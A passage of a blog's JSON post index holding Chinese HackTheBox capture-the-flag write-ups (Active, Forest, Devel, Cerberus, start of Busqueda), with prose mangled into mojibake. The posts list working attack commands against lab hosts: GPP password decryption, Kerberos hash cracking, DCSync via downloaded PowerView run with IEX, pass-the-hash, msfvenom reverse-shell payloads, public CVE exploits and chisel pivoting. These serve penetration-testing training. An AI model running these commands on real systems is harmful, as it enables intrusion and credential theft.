åœ¨å¦‚ä¸‹ç›®å½•ï¼Œæ‰¾åˆ°Groups.xmlæ–‡ä»¶ï¼Œæ²¡æ³•ç›´æ¥è¯»ï¼Œå°è¯•æŠŠå®ƒä¸‹è½½åˆ°æœ¬åœ°kaliï¼ˆGroups.xmlä½œç”¨å¯ä»¥ç†è§£ä¸ºåŸŸå†…ä¸»æœºçš„é…ç½®æ–‡ä»¶ï¼‰ cd active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\ smbè¿æ¥çª—å£æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ get Groups.xml æœ¬åœ°kaliæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ cat Groups.xml çœ‹åˆ°ä¸»æœºç”¨æˆ·å’Œå¯†ç ï¼Œç”¨gpp-decryptè§£å¯† gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18 å°è¯•ä»¥adminç”¨æˆ·è¿æ¥smbæœåŠ¡ï¼Œå¤±è´¥ smbclient -W 10.10.10.100 -U SVC_TGS //10.10.10.100/ADMIN$ ä»¥æ™®é€šç”¨æˆ·è¿æ¥smbæœåŠ¡ï¼ŒæˆåŠŸ smbclient -W 10.10.10.100 -U SVC_TGS //10.10.10.100/USERS è¯»user.txt cd SVC_TGS\\Desktop\\ get user.txt ä¸‰ã€æƒé™æå‡ç”¨å¦‚ä¸‹å‘½ä»¤è·å–SPNæˆåŠŸ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request æ•°æ®æ˜¯johnå¯ä»¥çˆ†ç ´çš„æ ¼å¼ï¼Œç›´æ¥johnçˆ†ç ´ï¼Œå¾—Administratorå¯†ç  john --wordlist=/usr/share/wordlists/rockyou.txt SPN.txt ç”¨Administratorè´¦æˆ·ç™»å½•ä¸»æœºï¼ŒæˆåŠŸè·å–systemæƒé™ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100 è¯»root.txtï¼ŒOverï¼ type C:\\Users\\Administrator\\Desktop\\root.txt å‚è€ƒhttps://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/active-writeup-w-o-metasploit","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Forest","slug":"HTB12-Forest-Easy","date":"2023-08-06T08:33:00.000Z","updated":"2023-08-20T08:40:29.698Z","comments":true,"path":"posts/9ab855b5.html","link":"","permalink":"https://wa0er.github.io/posts/9ab855b5.html","excerpt":"","text":"HTB-Forestä¸€ã€æ€è·¯æ¦‚è¦ä¸»è¦å·¥å…·ï¼š rpcclientï¼šå»ºç«‹null sessionå¹¶æ‰§è¡Œenumdomusersåˆ—ä¸¾åŸŸå†…ç”¨æˆ· ldapsearchï¼šåˆ—ä¸¾åŸŸå†…ç”¨æˆ· impacket-GetNPUsersï¼šæšä¸¾ç”¨æˆ·ä¿¡æ¯ crackmapexecï¼šç™»å½•smbæˆ–winrmæœåŠ¡ evil-winrmï¼šç™»å½•winrmæœåŠ¡ bloodhound-pythonï¼šè·å–Active Directoryä¿¡æ¯ impacket-secretsdumpï¼šæŠŠAdministratorçš„hashç»™dumpä¸‹æ¥ï¼ˆhashè½¬å‚¨ï¼‰ äºŒã€ä¿¡æ¯æ”¶é›†nmapæ‰«æ nmap -A 10.10.10.161 å¼€æ”¾çš„ç«¯å£æœåŠ¡æŒºå¤šçš„ï¼Œé¿å…é—æ¼ï¼Œå†ç”¨å¦‚ä¸‹å‘½ä»¤æ‰«ä¸€é nmap -p- --min-rate 10000 -Pn -sT 10.10.10.161 nmap -p- --min-rate 10000 -Pn -sU 10.10.10.161 ä¸‰ã€RPCBindç”¨rpcclientå»ºç«‹null sessionï¼ˆå³ä¸éœ€è¦ç”¨æˆ·åå’Œå£ä»¤ï¼‰ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤åˆ—ä¸¾åŸŸå†…ç”¨æˆ· rpcclient -U \"\" -N -c enumdomusers 10.10.10.161 å…¶ä¸­æœ‰ä¸€äº›SM_å’ŒHealthMailboxå¼€å¤´çš„ç”¨æˆ·æ˜¯å¾®è½¯Exchangeé‚®ä»¶æœåŠ¡ç›¸å…³ç”¨æˆ·ï¼Œå¯ä»¥å¿½ç•¥ å¦ä¸€ç§åˆ—ä¸¾åŸŸå†…ç”¨æˆ·çš„æ–¹æ³•æ˜¯ç”¨ldapsearchï¼Œå¦‚ä¸‹å‘½ä»¤ ldapsearch -x -b \"dc=htb,dc=local\" \"*\" -H ldap://10.10.10.161 | grep userPrincipalName -T ç„¶åæˆ‘ä»¬æŠŠç”¨æˆ·ä¿å­˜åˆ°ä¸€ä¸ªtxtæ–‡ä»¶ä¸­ å››ã€AS-REP Roastingç”¨impacket-GetNPUsersæšä¸¾ç”¨æˆ·ä¿¡æ¯ impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.10.10.161 è·å–åˆ°svc-alfrescoç”¨çš„çš„hashï¼Œä¿å­˜åˆ°ä¸€ä¸ªtxtæ–‡ä»¶ä¸­ $krb5asrep$23$svc-alfresco@HTB.LOCAL:0f16da7878199001a313c8d8fa5f4954$c12e97e4c0dc193904026abe565b276765c563f613e0a802e4ab5b567c6dc280194233cbbdc40813f6419cbb3072815f488be8c4af44646a46c02119c901099b34a562e0f18751b39b2de2ef108a5ee09d9131849e9fe5169e51ee585ae604810cd154f010fbd3b6a00c31e982ff23242c86d4e00c3c0e97ada71e93241f798e6ca453b3850807795d2b7910c7cfb56a9ec53b5b1425470b9a9408bb71c02456f7540c7d9d9c48687cc935a99d8c9799e0ad16022119ce88ecb84666393d1c91bdf26470464171641c6525c5d3026ce06bed360a6ca93305275419d1f478f10a92a8d006a23e ç”¨johnæŒ‡å®šå­—å…¸ï¼Œçˆ†ç ´hash john -w=/usr/share/wordlists/rockyou.txt hash.txt çˆ†ç ´æˆåŠŸï¼Œç”¨æˆ·ååŠå£ä»¤å·²çŸ¥ï¼Œç”¨crackmapexecéªŒè¯æ­¤è´¦æˆ· crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice -d htb.local éªŒè¯æˆåŠŸï¼Œç¡®è®¤æ­¤è´¦æˆ·æ­£ç¡® äº”ã€WinRMç„¶åæŠŠsmbæ›´æ¢æˆwinrmï¼Œçœ‹æ˜¯å¦æœ‰ç™»å½•winrmæœåŠ¡çš„æƒé™ crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice -d htb.local ç¡®å®æœ‰winrmæœåŠ¡çš„æƒé™ï¼Œç”¨evil-winrmç™»å½•ï¼Œå¦‚ä¸‹å›¾ï¼Œç™»å½•æˆåŠŸ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice å…­ã€æƒé™æå‡ç”¨bloodhound-pythonè·å–Active Directoryä¿¡æ¯ bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 --zip æ·»åŠ æ–°ç”¨æˆ·wa0erï¼Œå¹¶æŠŠç”¨æˆ·æ”¾åˆ°â€Exchange Windows Permissionsâ€ç”¨æˆ·ç»„å’Œâ€Remote Management Usersâ€ç”¨æˆ·ç»„ net user wa0er password /add /domain net group \"Exchange Windows Permissions\" wa0er /add net localgroup \"Remote Management Users\" wa0er /add éªŒè¯ç”¨æˆ·æœ‰æ•ˆæ€§ crackmapexec smb 10.10.10.161 -u wa0er -p 'password' -d htb.local å†™DACL æœ¬åœ°kaliå¼€å¯http.serveræœåŠ¡ python3 -m http.server 80 é¶æœºevil-winrmçª—å£ä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ (New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1') | IEX $SecPass = ConvertTo-SecureString 'password' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('htb.local\\wa0er', $SecPass) Add-ObjectACL -PrincipalIdentity wa0er -Credential $Cred -Rights DCSync ç°åœ¨ç”¨æˆ·wa0eræœ‰äº†DCSyncæƒé™ ç”¨impacket-secretsdumpæŠŠAdministratorçš„hashç»™dumpä¸‹æ¥ï¼ˆhashè½¬å‚¨ï¼‰ impacket-secretsdump htb.local/wa0er@10.10.10.161 -just-dc-user Administrator -just-dc-ntlm ç”¨crackmapexecå’Œä¼ é€’Administratorçš„hashï¼Œæ‰§è¡Œå‘½ä»¤ crackmapexec smb 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -d htb.local -x \"dir C:\\Users\\Administrator\\Desktop\" ä¼šæœ‰ä¸€äº›æŠ¥é”™ï¼Œä½†æ— ä¼¤å¤§é›… å¯çœ‹åˆ°æˆåŠŸä»¥Administratorèº«ä»½æ‰§è¡Œä»»æ„å‘½ä»¤ å‚è€ƒhttps://axcheron.github.io/writeups/htb/forest/","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Devel","slug":"HTB11-Devel-Easy","date":"2023-07-31T09:49:00.000Z","updated":"2023-08-10T08:51:30.436Z","comments":true,"path":"posts/97f065fe.html","link":"","permalink":"https://wa0er.github.io/posts/97f065fe.html","excerpt":"","text":"HTB-Develä¸€ã€æ€è·¯æ¦‚è¦1.ç«¯å£æ‰«æå‘ç°å­˜åœ¨å¯åŒ¿åç™»å½•çš„FTPæœåŠ¡ï¼Œä¸»é¡µå“åº”åŒ…å‘ç°æ˜¯ASP.NETè¯­è¨€ï¼› 2.msfvenomåˆ¶ä½œaspxæœ¨é©¬åå¼¹shellï¼› 3.systeminfoå‘ç°windows 7 build 7600æ²¡æ‰“è¡¥ä¸ï¼› 4.MS11-046ææƒã€‚ äºŒã€ä¿¡æ¯æ”¶é›†nmapç«¯å£æ‰«æ å¼€æ”¾ç«¯å£ï¼š21ï¼ˆftpï¼‰ã€80ï¼ˆhttpï¼‰ï¼Œå…¶ä¸­ftpå…è®¸åŒ¿åç™»å½• æµè§ˆå™¨è®¿é—®é¶æœºIPï¼Œä¸»é¡µå¦‚ä¸‹ï¼Œè®¿é—®iisstart.htmé¡µé¢ä¸€æ · BurpæŠ“åŒ…å¯çœ‹åˆ°å“åº”åŒ…ä¸­X-Powered-Byå­—æ®µå€¼ï¼Œè¯´æ˜ç½‘ç«™ä½¿ç”¨ASP.NETè¯­è¨€ï¼Œå¯ä»¥å°è¯•ftpä¼ ä¸€ä¸ªaspxçš„æœ¨é©¬ åœ¨æœ¬åœ°kaliæŸ¥æ‰¾aspxæœ¨é©¬ï¼Œæ­¤å¤„é€‰æ‹©ç”¨seclistsçš„ï¼ˆseclistsæ˜¯githubçš„ä¸€ä¸ªå¼€æºå­—å…¸é¡¹ç›®ï¼‰ å¦‚ä¸‹å‘½ä»¤å¤åˆ¶åˆ°å½“å‰ç›®å½• cp /usr/share/seclists/Web-Shells/FuzzDB/cmd.aspx ./ åŒ¿åè¿æ¥FTPæœåŠ¡å¹¶ä¸Šä¼ aspxæœ¨é©¬ æŸ¥çœ‹ï¼Œæœ¨é©¬è¢«ä¼ åˆ°ç½‘ç«™æ ¹ç›®å½• è®¿é—®æœ¨é©¬ï¼Œæ‰§è¡Œå‘½ä»¤æˆåŠŸï¼Œæ¥ä¸‹æ¥ç”¨msfvenomç”Ÿæˆaspxæœ¨é©¬åå¼¹shell ä¸‰ã€msfvenomåˆ¶ä½œaspxæœ¨é©¬åå¼¹shellå¯ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹æ”¯æŒçš„æ ¼å¼å’Œpayload msfvenom --list formats msfvenom --list payloads | grep 'shell_reverse_tcp' åˆ¶ä½œåå¼¹shellæœ¨é©¬ msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.5 LPORT=9898 -o reverse-shell.aspx ç”¨FTPä¸Šä¼  ftp&gt; put reverse-shell.aspx æœ¬åœ°kaliå¼€å¯ncç›‘å¬nc -lvnp 9898 æµè§ˆå™¨è®¿é—®ï¼šhttp://10.10.10.5/reverse-shell.aspxï¼ŒæˆåŠŸè·å–shell æ‰§è¡Œsysteminfoå‘½ä»¤æŸ¥çœ‹ä¸»æœºä¿¡æ¯ï¼ŒWin7 Build 7600æ²¡æ‰“è¡¥ä¸ googleæœç´¢å…³é”®å­—ï¼šmicrosoft windows 7 build 7600 exploit https://www.exploit-db.com/exploits/40564 EDB-IDæ˜¯40564 å››ã€MS11-046ææƒæœ¬åœ°kaliæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æ›´æ–°exploitæ•°æ®åº“å¹¶æŸ¥æ‰¾EDB-IDä¸º40564çš„exploit searchsploit -u searchsploit -m 40564 aptä¸‹è½½mingw-w64 apt update apt install mingw-w64 ç¼–è¯‘40564.c i686-w64-mingw32-gcc 40564.c -o 40564.exe -lws2_32 æœ¬åœ°kaliå¼€å¯httpæœåŠ¡ python3 -m http.server 80 é¶æœºæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œä¸‹è½½ç¼–è¯‘å¥½çš„40564.exeï¼ˆæ‰§è¡Œå‘½ä»¤åï¼Œç¨ç­‰ä¸€åˆ†é’ŸæŒ‰ä¸€ä¸‹å›è½¦ï¼‰ powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.5:80/40564.exe', 'c:\\Users\\Public\\Downloads\\40564.exe')\" å¯çœ‹åˆ°40564.exeå·²è¢«ä¸‹è½½åˆ°é¶æœº æ‰§è¡Œ40564.exeï¼ŒæˆåŠŸææƒï¼ŒOverï¼ flagä½ç½® c:\\Users\\babis\\Desktop\\user.txt c:\\Users\\Administrator\\Desktop\\root.txt å‚è€ƒhttps://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/devel-writeup-w-o-metasploit https://0xdf.gitlab.io/2019/03/05/htb-devel.html å¦ä¸€ç§ä»¥MSFä¸ºä¸»çš„getshellã€ææƒæ€è·¯æœ¬åœ°kaliåˆ¶ä½œaspxæœ¨é©¬ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=9899 -f aspx -o met_rev_9899.aspx ftpä¸Šä¼ æœ¨é©¬ ftp&gt; put met_rev_9899.aspx å¯åŠ¨MSFæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤è¿›è¡Œç›‘å¬ msfconsole use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lhost tun0 set lport 9899 run æ–°å¼€ä¸€ä¸ªç»ˆç«¯æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤è®¿é—®aspxæœ¨é©¬ curl http://10.10.10.5/met_rev_9899.aspx å¯çœ‹åˆ°æˆåŠŸgetshell æŠŠshellä¼šè¯ï¼ˆæ­¤å¤„ä¸ºsession 1ï¼‰æ”¾åˆ°åå°ï¼Œå¹¶æŸ¥çœ‹å¯åˆ©ç”¨çš„exploit background use post/multi/recon/local_exploit_suggester set session 1 run ç”¨ms10-015æ¨¡å—ææƒ use exploit/windows/local/ms10_015_kitrap0d set lhost tun0 set lport 9900 set session 1 run","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Cerberus","slug":"HTB10-Cerberus-Hard","date":"2023-07-24T08:53:00.000Z","updated":"2023-08-10T08:51:30.438Z","comments":true,"path":"posts/7761233f.html","link":"","permalink":"https://wa0er.github.io/posts/7761233f.html","excerpt":"","text":"HTB-Cerberusä¸€ã€æ€è·¯æ¦‚è¦1.ä¿¡æ¯æ”¶é›†æ‰¾åˆ°icingaæœåŠ¡ï¼› 2.CVE-2022-24716ï¼ˆç›®å½•éå†ï¼‰å‘ç°åŸŸæ§ä¸»æœºå’Œicingaè´¦æˆ·ï¼› 3.CVE-2022-24715ï¼ˆRCEï¼‰è·å–www-dataç”¨æˆ·æƒé™ï¼Œlinpeasåˆ†æå‘ç°/usr/bin/firejailï¼› 4.CVE-2022-31214ï¼ˆFirejailæœ¬åœ°ææƒï¼‰è·å–rootæƒé™ï¼Œå¹¶è¯»å–SSSDç¼“å­˜æ‰¾åˆ°åŸŸæ§è´¦æˆ·ï¼› 5.fscanæ‰«åŸŸæ§ä¸»æœºç«¯å£å‘ç°5985ï¼ˆWinrmæœåŠ¡ï¼‰ï¼› 6.chiselåšä»£ç†å°†5985ç«¯å£æµé‡ä»£ç†åˆ°æœ¬åœ°ï¼Œç”¨evil-winrmç™»å½•åŸŸæ§ä¸»æœºï¼› 7.å‘ç°ManageEngine ADSelfService PlusæœåŠ¡ï¼Œchiselåšsocksä»£ç†ï¼Œè®¿é—®9251æœåŠ¡ï¼ŒMSFææƒã€‚ äºŒã€ä¿¡æ¯æ”¶é›†Nmap nmap -A 10.10.11.205 å¼€æ”¾ç«¯å£8080ï¼ŒURLï¼šhttp://icinga.cerberus.local:8080/icingaweb2 æ·»åŠ åŸŸååˆ°hostsæ–‡ä»¶ echo \"10.10.11.205 icinga.cerberus.local\" &gt;&gt; /etc/hosts è®¿é—®URLï¼Œç•Œé¢å¦‚ä¸‹ ä¸‰ã€CVE-2022-24716ï¼ˆç›®å½•éå†ï¼‰googleæœç´¢å…³é”®å­—ï¼šicinga exploit CVE-2022-24716ï¼šhttps://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/ è®¿é—®ï¼šhttp://icinga.cerberus.local:8080/icingaweb2/lib/icinga/icinga-php-thirdparty/etc/hosts ç¡®è®¤å­˜åœ¨ç›®å½•éå†ï¼Œä¸”å¯çœ‹åˆ°æœ‰åŸŸæ§ï¼ŒIPä¸º172.16.22.1 åˆæ‰¾åˆ°å¦‚ä¸‹æ–‡ç«  https://exploit-notes.hdks.org/exploit/web/icinga-web-pentesting/ Icingaå®˜æ–¹é…ç½®æ–‡æ¡£ï¼šhttps://icinga.com/docs/icinga-web/latest/doc/03-Configuration/ è¯»åˆ°å¦‚ä¸‹æ•æ„Ÿä¿¡æ¯ username = \"matthew\" password = \"IcingaWebPassword2023\" æˆåŠŸç™»å½• å››ã€CVE-2022-24715ï¼ˆRCEï¼‰å‚è€ƒåˆšæ‰çš„æ–‡ç« ï¼Œå¤ç°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´CVE-2022-24715 å…ˆç›‘å¬ç«¯å£ nc -lvnp 9898 ç„¶åç”ŸæˆPEMæ–‡ä»¶ ssh-keygen -m pem æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ Exploitï¼šhttps://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py python3 CVE-2022-24715.py -t http://icinga.cerberus.local:8080/icingaweb2/ -I 10.10.14.8 -P 9898 -u matthew -p IcingaWebPassword2023 -e cert.pem æ³¨ï¼šå›¾ä¸­IPï¼ˆ10.10.14.35ï¼‰ä¸å‘½ä»¤ä¸ä¸€è‡´æ˜¯ç”±äºé¶æœºç¯å¢ƒä¸ç¨³å®šï¼Œæ‰“é¶æœŸé—´openvpné‡è¿è¿‡ æˆåŠŸåå¼¹åˆ°shellï¼Œç”¨æˆ·www-dataï¼Œæƒé™æ¯”è¾ƒä½ åˆ‡æ¢æˆäº¤äº’å¼shellï¼Œä¾¿äºæ‰§è¡Œå‘½ä»¤ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' æœ¬åœ°kaliå¼€å¯httpæœåŠ¡ï¼Œä¼ ä¸€ä¸ªlinpeasåˆ°é¶æœºï¼ˆæ­¤HTTPæœåŠ¡å»ºè®®ä¸€ç›´å¼€ç€ï¼Œåç»­ä¼šä¼ å¥½å‡ ä¸ªæ–‡ä»¶ï¼‰ python3 -m http.server 80 é¶æœºçš„shellçª—å£ï¼Œä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ cd /tmp wget http://10.10.14.8:80/linpeas.sh chmod +x linpeas.sh ./linpeas.sh linpeasåˆ†æç»“æœä¸­ï¼Œæ‰¾åˆ°å¦‚ä¸‹å›¾çš„ä¿¡æ¯ï¼Œ/usr/bin/firejailä¸æ˜¯ä¸€ä¸ªå¸¸è§„æ–‡ä»¶ äº”ã€CVE-2022-31214ï¼ˆFirejailæœ¬åœ°ææƒï¼‰googleæœç´¢å…³é”®å­—ï¼šfirejail exploit https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25 æŠŠä»¥ä¸Šé“¾æ¥çš„ä»£ç å¤åˆ¶åˆ°æœ¬åœ°kaliçš„CVE-2022-31214.pyæ–‡ä»¶ä¸­ï¼Œç„¶ååœ¨é¶æœºçš„shellçª—å£ç”¨wgetä»æœ¬åœ°ä¸‹è½½ï¼Œä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ wget http://10.10.14.8:80/CVE-2022-31214.py chmod +x CVE-2022-31214.py python3 CVE-2022-31214.py åœ¨æœ¬åœ°kaliå¼€ä¸€ä¸ªæ–°ç»ˆç«¯çª—å£ï¼Œå†å¼¹ä¸€ä¸ªshellå›æ¥ï¼Œç„¶åä¾æ¬¡æ‰§è¡Œä¸‹åˆ—å‘½ä»¤ï¼ŒæˆåŠŸè·å–rootæƒé™ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' firejail --join=94129 #æ­¤å¤„94129æ¢æˆå¯¹åº”ç”Ÿæˆçš„å€¼ su - linpeasç»“æœä¸­ï¼Œè¿˜çœ‹åˆ°å¦‚ä¸‹å†…å®¹ SSSDï¼šhttps://sssd.io/docs/introduction.html åœ¨å¦‚ä¸‹ç›®å½•ä½ç½®æŸ¥çœ‹ç¼“å­˜ root@icinga:/var/lib/sss/db# strings cache_cerberus.local.ldb matthew@cerberus.local $6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0 çˆ†ç ´å‡ºhashå€¼ john -w=/usr/share/wordlists/rockyou.txt hash.txt 147258369 fscanæ‰«åŸŸæ§ä¸»æœºï¼ˆ172.16.22.1ï¼‰ç«¯å£ï¼Œçœ‹åˆ°5985ç«¯å£å¼€æ”¾ wget http://10.10.14.8:80/fscan_amd64 chmod +x fscan_amd64 ./fscan_amd64 -h 172.16.22.1 -p 1-65535 å…­ã€WinrmæœåŠ¡ç™»å½•åŸŸæ§googleå…³é”®è¯ï¼š5985ç«¯å£ æœåˆ°WinrmæœåŠ¡ ç”¨chiselæŠŠåŸŸæ§ä¸»æœº5985ç«¯å£æµé‡è½¬å‘åˆ°æœ¬åœ°kali Kaliä»¥æœåŠ¡ç«¯è¿è¡Œchisel chisel server -p 9899 --reverse é¶æœºä»¥å®¢æˆ·ç«¯è¿è¡Œchisel wget http://10.10.14.8:80/chisel chmod +x chisel ./chisel client --max-retry-count=1 10.10.14.8:9899 R:5985:172.16.22.1:5985 é¶æœºæ‰§è¡Œå®Œä¸Šè¿°å‘½ä»¤åï¼Œåœ¨æœ¬åœ°kaliå¯çœ‹åˆ°å¦‚ä¸‹ç•Œé¢ï¼Œæœ€åä¸€è¡Œè¡¨ç¤ºæµé‡è½¬å‘è¿æ¥å·²å»ºç«‹ åœ¨æœ¬åœ°kaliç”¨evil-winrmç™»å½•WinrmæœåŠ¡ evil-winrm -i 127.0.0.1 -u matthew -p 147258369 userflagåœ¨C:\\Users\\matthew\\Desktopç›®å½•ä¸‹ï¼Œä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æˆåŠŸè·å–userflag cd ../Desktop type user.txt ä»æœ¬åœ°kaliä¼ ä¸€ä¸ªwinPEASåˆ°åŸŸæ§ä¸»æœºï¼Œè¿è¡Œä¸€ä¸‹ï¼Œå‘ç°è¿è¡Œåˆ°ä¸€åŠä¼šæŠ¥é”™ä¸­æ–­ï¼Œä¹Ÿæ²¡ä»€ä¹ˆæœ‰ä»·å€¼çš„ ./winPEASany.exe åœ¨C:\\Program Files (x86)ç›®å½•çœ‹åˆ°ManageEngineæœåŠ¡ è¿›åˆ°ManageEngineç›®å½•ï¼Œçœ‹åˆ°ADSelfService PlusæœåŠ¡ ä¸ƒã€ManageEngine ADSelfService PlusæœåŠ¡ææƒgoogleå…³é”®å­—ï¼šManageEngine ADSelfService Plus port å®˜æ–¹æ–‡æ¡£ï¼šhttps://www.manageengine.com/products/self-service-password/help/admin-guide/Admin/connection.html ä»å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°ADSelfService Plusé»˜è®¤ç«¯å£æ˜¯8888(http)å’Œ9251(https) å› ä¸ºæœ‰httpæœåŠ¡ï¼Œæ‰€ä»¥éœ€è¦åšä¸€ä¸ªsocksä»£ç† æœ¬åœ°kaliä»¥æœåŠ¡ç«¯è¿è¡Œchisel chisel server -p 9900 --reverse é¶æœºä»¥å®¢æˆ·ç«¯è¿è¡Œchisel cd \"C:\\Users\\matthew\\Desktop\" curl 10.10.14.8/chisel.exe -o chisel.exe ./chisel.exe client --max-retry-count=1 10.10.14.8:9900 R:1080:socks é¶æœºè¿è¡Œå®Œä¸Šè¿°å‘½ä»¤åï¼Œæœ¬åœ°kaliå¯çœ‹åˆ°å¦‚ä¸‹ç•Œé¢ï¼Œè¡¨ç¤ºsocksä»£ç†å·²å»ºç«‹ ç›®å‰ä¸ºæ­¢ï¼Œå»ºç«‹äº†ä¸¤æ¡ä»£ç†è·¯çº¿ 10.10.14.8ï¼ˆæœ¬åœ°kaliï¼‰ 172.16.22.1ï¼ˆåŸŸæ§ä¸»æœºï¼‰ 9899ç«¯å£ 5985ç«¯å£ï¼ˆWinrmæœåŠ¡ï¼‰ 9900ç«¯å£ 1080ï¼ˆsocksä»£ç†ï¼Œä¸ºäº†è¿æ¥9251ç«¯å£æœåŠ¡ï¼‰ åœ¨æœ¬åœ°hostsæ–‡ä»¶æ·»åŠ å¦‚ä¸‹æ¡ç›®ï¼Œå¹¶æŠŠæœ€å¼€å§‹æ·»åŠ çš„é‚£æ¡10.10.11.205çš„è®°å½•ç»™æ³¨é‡Šæ‰ 127.0.0.1 cerberus.local icinga.cerberus.local dc.cerberus.local æµè§ˆå™¨çš„ä»£ç†æ’ä»¶ä¿®æ”¹ä»£ç†å¦‚ä¸‹ ç„¶åæµè§ˆå™¨è®¿é—®ï¼šhttps://dc.cerberus.local:9251ï¼Œå¾—åˆ°å¦‚ä¸‹ç•Œé¢ ç”¨ä¹‹å‰è·å¾—çš„è´¦å·å¯†ç ç™»å½• matthew@cerberus.local 147258369 ç™»å½•æˆåŠŸæ˜¯å¦‚ä¸‹ç•Œé¢ï¼Œåœ¨URLå¯çœ‹åˆ°guidï¼Œåœ¨F12æ§åˆ¶å°å¯çœ‹åˆ°è¯·æ±‚å¤´æœ‰ä¸€ä¸²ç¼–ç  base64è§£ç ã€æ ¼å¼åŒ–ä¹‹åï¼Œå¾—åˆ°å¦‚ä¸‹ä»£ç ï¼Œçœ‹åˆ°Issuer å¯åŠ¨MSFï¼Œæœç´¢ADSelfServiceçš„exploit msfconsole search ADSelfService é€‰ä¸­exploitå¹¶è®¾ç½®å‚æ•°ï¼ˆæ³¨æ„è®¾ç½®socksä»£ç†ï¼‰ use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966 set GUID 67a8d101690402dc6a6744b8fc8a7ca1acf88b2f set ISSUER_URL http://dc.cerberus.local/adfs/services/trust set RHOSTS 172.16.22.1 set LHOST 10.10.14.8 set AutoCheck false set ReverseAllowProxy true set Proxies socks5:127.0.0.1:1080 run è¿è¡Œexploitï¼ŒæˆåŠŸè·å–systemæƒé™ å‚è€ƒhttps://hackmd.io/@b3n5/rJRSRUGBn https://blog.csdn.net/qq_58869808/article/details/129786875 https://www.ngui.cc/article/show-1006958.html?action=onClick","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Busqueda","slug":"HTB9-Busqueda","date":"2023-04-15T11:11:00.000Z","updated":"2023-08-31T07:58:33.863Z","comments":true,"path":"posts/d91931aa.html","link":"","permalink":"https://wa0er.github.io/posts/d91931aa.html","excerpt":"","text":"HTB-Busquedaä¸€ã€æ€è·¯æ¦‚è¦1.ä¿¡æ¯æ”¶é›†å‘ç°å‘½ä»¤æ³¨å…¥ï¼› 2.å‘½ä»¤æ³¨å…¥åå¼¹shellè·å–svcç”¨æˆ·æƒé™ï¼› 3.Gitä¿¡æ¯æ³„éœ²å¯†ç ï¼› 4.sudo -lå‘ç°å¯suidææƒï¼› 5.suidææƒè·å–rootæƒé™ã€‚ äºŒã€ä¿¡æ¯æ”¶é›†Nmapï¼Œå…ˆæ‰«ç«¯å£ï¼Œåæ‰«æœåŠ¡ å¼€æ”¾ç«¯å£ï¼š22ï¼ˆsshï¼‰ã€80ï¼ˆhttpï¼‰ï¼›åŸŸåï¼šsearcher.htb æ·»åŠ åŸŸåè§£æè®°å½•åˆ°æœ¬åœ°hostsæ–‡ä»¶ echo \"10.10.11.208 searcher.htb\" &gt;&gt; /etc/hosts 